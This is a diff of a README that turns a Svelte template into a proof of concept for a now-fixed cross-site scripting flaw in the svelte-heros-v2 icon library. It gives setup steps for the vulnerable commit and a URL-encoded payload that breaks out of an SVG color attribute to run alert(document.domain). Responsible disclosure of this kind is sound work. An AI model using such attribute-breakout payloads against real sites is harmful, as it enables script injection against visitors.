@@ -1,38 +1,36 @@
-# create-svelte
+# svelte-heros-v2 Vulnerbability Proof of Concept
 
-Everything you need to build a Svelte project, powered by [`create-svelte`](https://github.com/sveltejs/kit/tree/master/packages/create-svelte).
+[svelte-heros-v2](https://github.com/shinokada/svelte-heros-v2) is an easy to use heros icon library for svelte projects.
+But recent days, I found a vulnerbility in the library. I reported it to the author and he fixed it. I am going to show you how I found it and how to fix it.
+- [issues](https://github.com/shinokada/svelte-heros-v2/issues/15)
+- [0.5.1 (fixed version)](https://github.com/shinokada/svelte-heros-v2/commit/aed5f0c03f63336e159e2239129a54d377a8eab1)
 
-## Creating a project
+## Try it yourself
 
-If you're seeing this, you've probably already done this step. Congrats!
+```sh
+# Clone the vuln PoC
+git clone https://github.com/ZoneTwelve/svelte-heros-v2-vuln-PoC.git
+cd svelte-heros-v2-vuln-PoC
+# change the commit version d154313cc3031b90f529528fae6fef772103ed4e
+git checkout d154313cc3031b90f529528fae6fef772103ed4e
+# install dependencies
+npm install
+# or use pnpm
+pnpm install
 
-```bash
-# create a new project in the current directory
-npm create svelte@latest
-
-# create a new project in my-app
-npm create svelte@latest my-app
-```
-
-## Developing
-
-Once you've created a project and installed dependencies with `npm install` (or `pnpm install` or `yarn`), start a development server:
-
-```bash
+# start the app
 npm run dev
 
-# or start the server and open the app in a new browser tab
-npm run dev -- --open
+# open http://localhost:5173 
+## And you will see a blue eye in the page
+echo "http://localhost:5173"
+
+# open http://localhost:5173/?color=green
+## The page will show a green eye in the top of Counter component
+echo "http://localhost:5173/?color=green"
+
+# Payload: `red"/> <svg onload=alert(document.domain);> <path a="`
+# Open http://localhost:5173/?color=red%22/%3E%20%3Csvg%20onload=alert(document.domain);%3E%20%3Cpath%20a=%22
+## The page will show a alert box with the domain name of the page
+echo "http://localhost:5173/?color=red%22/%3E%20%3Csvg%20onload=alert(document.domain);%3E%20%3Cpath%20a=%22"
 ```
-
-## Building
-
-To create a production version of your app:
-
-```bash
-npm run build
-```
-
-You can preview the production build with `npm run preview`.
-
-> To deploy your app, you may need to install an [adapter](https://kit.svelte.dev/docs/adapters) for your target environment.
